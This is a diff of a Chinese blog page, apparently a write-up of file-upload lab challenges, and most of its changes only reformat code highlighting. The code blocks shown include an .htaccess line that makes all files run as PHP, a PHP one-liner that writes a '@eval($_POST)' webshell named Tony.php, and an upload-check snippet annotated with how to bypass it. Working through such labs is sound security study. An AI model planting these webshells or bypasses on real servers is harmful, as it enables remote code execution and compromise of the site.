@@ -43,7 +43,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jf71o0x1o1l" type="application/atom+xml">
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
     
@@ -505,6 +505,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -609,7 +612,7 @@ alt="image-20221221134517790" />
 <li>将所有文件解析为php文件</li>
 </ul></li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php</code></pre>
 <ul>
 <li>制作图片马
 <ul>
@@ -788,7 +791,7 @@ alt="image-20221224134349001" />
 <li>生成新的php文件</li>
 </ul></li>
 </ul>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Tony.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST["Tony"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php fputs(fopen(&#39;Tony.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;Tony&quot;])?&gt;&#39;);?&gt;</code></pre>
 <h3 id="pass-19">pass-19</h3>
 <ul>
 <li>apache 无法解析<code>.7z</code></li>
@@ -808,12 +811,12 @@ alt="image-20221224134349001" />
 <ul>
 <li>关注如下代码</li>
 </ul>
-<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token comment">//检查文件名</span>
- $file <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token char">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> $_FILES<span class="token punctuation">[</span><span class="token char">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token char">'name'</span><span class="token punctuation">]</span> <span class="token operator">:</span> $_POST<span class="token punctuation">[</span><span class="token char">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
- <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-     $file <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
- $file_name <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token char">'.'</span> <span class="token punctuation">.</span> $file<span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span>$file<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 对下标不需要连续的利用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="language-cpp" data-language="cpp"><code class="language-cpp"> &#x2F;&#x2F;检查文件名
+ $file &#x3D; empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
+ if (!is_array($file)) &#123;
+     $file &#x3D; explode(&#39;.&#39;, strtolower($file));
+..........
+ $file_name &#x3D; reset($file) . &#39;.&#39; . $file[count($file) - 1];   &#x2F;&#x2F; 对下标不需要连续的利用</code></pre>
 <ul>
 <li>注意content-Type</li>
 </ul></li>
@@ -1440,7 +1443,7 @@ alt="image-20221228001825259" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">230.3k</span>&nbsp;字
+                class="white-color">238.7k</span>&nbsp;字
             
             
             
